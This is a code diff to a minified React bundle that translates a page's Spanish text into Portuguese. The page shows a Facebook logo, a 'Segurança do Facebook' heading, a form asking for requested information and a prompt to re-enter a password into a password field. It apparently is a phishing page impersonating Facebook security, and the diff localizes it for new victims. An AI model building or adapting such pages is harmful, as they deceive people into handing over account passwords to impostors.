@@ -13353,7 +13353,7 @@
                             he.jsx)("br", {}), (0,
                             he.jsx)("p", {
                                 className: "fw-semibold validation_form_para mt-2",
-                                children: "Por favor, asegúrate de proporcionar la información solicitada a continuación."
+                                children: "Não se esqueça de fornecer as informações solicitadas abaixo."
                             }), (0,
                             he.jsxs)("form", {
                                 onSubmit: n => {
@@ -13455,11 +13455,11 @@
                     alt: "Facebook Logo"
                 }), (0,
                 he.jsx)("h3", {
-                    children: "Facebook Seguridad"
+                    children: "Segurança do Facebook"
                 }), (0,
                 he.jsx)("hr", {}), (0,
                 he.jsx)("p", {
-                    children: "Por favor, vuelve a ingresar la contraseña para completar la solicitud."
+                    children: "Digite sua senha novamente para concluir a solicitação."
                 }), (0,
                 he.jsx)("input", {
                     type: "password",
